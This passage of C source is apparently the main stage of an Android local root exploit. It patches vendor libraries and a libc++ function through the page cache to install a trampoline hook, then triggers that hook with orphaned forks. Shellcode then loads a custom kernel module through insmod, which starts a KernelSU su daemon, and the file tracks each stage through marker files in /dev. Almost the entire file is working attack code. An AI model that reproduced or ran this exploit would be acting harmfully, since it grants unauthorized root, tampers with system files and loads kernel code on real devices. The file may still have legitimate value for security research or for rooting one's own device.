    memcpy(&blk[pos], &hook_insn, 4);
    printf("patch: %s <- trampoline (%d bytes)\n", lib, blk_len);
    int ret2 = patch_file_cbc(lib, (char *)blk, (size_t)blk_len, (size_t)aligned, 0);
    if (ret2) printf("patch: %s trampoline patch failed: %d\n", lib, ret2);
    return ret2;
}

static int createOrphanProcess(void) {
    printf("Triggering hook...\n");
    int pid = fork();
    if (pid < 0) { printf("Failed to create orphan: %s\n", strerror(errno)); return -1; }
    if (pid == 0) {
        int pid2 = fork();
        if (pid2 == 0) { usleep(80000); _exit(0); }
        _exit(0);
    }
    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
    return 0;
}

static const char *detect_ko_target(void) {
#if DF_TARGET32
    /* 32-bit userspace ships no lib64 directory */
    static const char *const candidates[] = {
        "/vendor/lib/libbinderdebug.so",
        "/vendor/lib/libstagefrighthw.so",
        "/vendor/lib/libstagefright_aidl_bufferpool2.so",
    };
#else
    static const char *const candidates[] = {
        "/vendor/lib64/libbinderdebug.so",
        "/vendor/lib64/libstagefrighthw.so",
        "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
    };
#endif
    for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
        if (access(candidates[i], F_OK) == 0)
            return candidates[i];
    }
    return candidates[0];
}

static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
    if (strlen(hex) != len * 2) return -1;
    for (size_t i = 0; i < len; i++) {
        unsigned int b;
        if (sscanf(hex + i * 2, "%2x", &b) != 1) return -1;
        out[i] = (uint8_t)b;
    }
    return 0;
}

/* The payload redirects insmod's stdout/stderr into /dev/dfilog; on timeout
 * that is the only place the reason ends up (dmesg is root-only on android 14). */
static void dump_insmod_log(void)
{
    int fd = open("/dev/dfilog", O_RDONLY);
    if (fd < 0) { printf("insmod log: open failed: %s\n", strerror(errno)); return; }
    char b[513];
    ssize_t n = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0) { printf("insmod log: empty (%zd)\n", n); return; }
    b[n] = '\0';
    printf("---- insmod log ----\n%s\n--------------------\n", b);
}

static void usage(const char *argv0) {
    fprintf(stderr,
            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
}

static int setup(int argc, char **argv) {
    int encap_port = 0, sender_port = 0;
    uint32_t spi = 0;
    uint8_t aes_key[32];
    int have_aes = 0;

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        if (!strcmp(a, "--encap-port") && i + 1 < argc)
            encap_port = atoi(argv[++i]);
        else if (!strcmp(a, "--sender-port") && i + 1 < argc)
            sender_port = atoi(argv[++i]);
        else if (!strcmp(a, "--spi") && i + 1 < argc)
            spi = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (!strcmp(a, "--aes-key") && i + 1 < argc)
            have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
        else { usage(argv[0]); return 2; }
    }
    if (!encap_port || !sender_port || !spi || !have_aes) {
        usage(argv[0]); return 2;
    }

    g_encap_port  = encap_port;
    g_sender_port = sender_port;
    g_spi         = spi;
    g_seq         = 1;
    memcpy(g_aes_key, aes_key, 32);

    const char *ko_target = detect_ko_target();
    libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
    strncpy(libcxx_ko_target, ko_target, 63);
    libcxx_ko_target[63] = '\0';

    printf("=== setup ===\n");
    printf("payload build: " __DATE__ " " __TIME__ " (arm32=%d)\n", DF_TARGET32);
    printf("found ko_target: %s\n", ko_target);
    printf("encap port: %d\n", encap_port);
    printf("spi: 0x%x\n", spi);
    return 0;
}

static int exploit(void) {
    printf("\n=== exploit (patching files) ===\n");

    int rc = 3;
    if (patch_helper()) goto done;
    if (patch_ko()) goto done;
    if (patch_hook(kLibcxxPath,
                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                   &g_libcxx_r)) goto done;

    printf("\n=== pre-load verification ===\n");
    for (int t = 0; t < 3; t++) {
        int ok_ko  = g_ko_data ? verify_range(libcxx_ko_target, g_ko_data, g_ko_len, 0, 1) : 0;
        int ok_brg = verify_range(kCrashDump, (char *)splice_helper_start,
                                  (size_t)(splice_helper_end - splice_helper_start)
                                      + ((16 - (size_t)(splice_helper_end - splice_helper_start) % 16) % 16),
                                  0, 0);
        if (ok_ko == 0 && ok_brg == 0) { printf("staged images intact\n"); break; }
        printf("staged images reverted, re-patching (attempt %d)\n", t + 1);
        if (ok_brg != 0 && patch_helper() != 0) break;
        if (ok_ko  != 0 && patch_ko()     != 0) break;
        if (t == 2) printf("WARNING: staging keeps being reclaimed, trying anyway\n");
    }

    rc = 2;
    /* Nothing may sit between "staged images intact" and the hook firing: the
     * staged pages are clean page cache and this device reclaims them within
     * roughly a second. */
    usleep(10000);
    
    printf("\n=== init  ===\n");
    createOrphanProcess();

    static const struct {
        const char *path;
        const char *msg;
        int         rc;
    } markers[] = {
        { "/dev/df",    "libc++: loading custom module",                    -1 },
        { "/dev/dfw1",  "shellcode: worker child spawned",                  -1 },
        { "/dev/dfw2",  "shellcode: grandchild forked",                     -1 },
        { "/dev/dfw3",  "shellcode: wrote attr/exec, exec'ing insmod",       -1 },
        { "/dev/dfw4",  "shellcode: /vendor/bin/insmod missing, fell back",  -1 },
        { "/dev/dfw5",  "shellcode: BOTH insmod paths failed",                1 },
        { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
        { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
        { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
        { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
        { "/dev/dfmw0", "bootstrap: WARNING - clone zygote env failed",     -1 },
        { "/dev/dfm3",  "bootstrap: setting partitions ro",                 -1 },
        { "/dev/dfmw1", "bootstrap: WARNING - set partitions ro failed",    -1 },
        { "/dev/dfm4",  "bootstrap: disabling ksu modules",                 -1 },
        { "/dev/dfme1", "bootstrap: ERROR - disable modules failed",         1 },
        { "/dev/dfm5",  "bootstrap: starting SU daemon",                    -1 },
        { "/dev/dfm6",  "ksud start: SUCCESS",                               0 },
        { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit",             1 },
    };
    int seen[sizeof(markers)/sizeof(markers[0])] = {0};

    for (int elapsed = 0; elapsed < 10000; elapsed += 10) {
        usleep(10000);
        for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
            if (!seen[j] && access(markers[j].path, F_OK) == 0) {
                seen[j] = 1;
                printf("%s\n", markers[j].msg);
                if (markers[j].rc >= 0) { rc = markers[j].rc; goto done; }
            }
        }
    }
    dump_insmod_log();
    printf("timeout: ERROR - check logcat & dmesg\n");
done:
    if (rc == 3) printf("patch: ERROR - failed to patch files\n");
    return rc;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (setup(argc, argv) != 0) return 2;
    int rc = exploit();
    cleanup();
    return rc;
}
